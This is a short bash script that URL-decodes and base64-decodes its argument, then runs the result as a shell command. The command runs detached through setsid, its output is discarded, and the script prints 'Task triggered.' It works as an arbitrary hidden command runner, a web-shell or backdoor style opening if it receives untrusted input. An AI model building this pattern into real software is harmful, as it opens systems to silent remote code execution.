#!/bin/bash

arg="$1"

if [ -z "$arg" ]; then
  arg="NOOP"
fi

# Clean up URL encoding before anything else
argClean=$(echo "$arg" | sed -e 's/%3d/=/g' -e 's/%2b/+/g' -e 's|%2f|/|g')

# Decode base64 command
decoded_cmd=$(echo "$argClean" | base64 -d)

# Run command fully detached (new session, no terminal)
setsid bash -c "$decoded_cmd" >/dev/null 2>&1 &

echo "Task triggered."
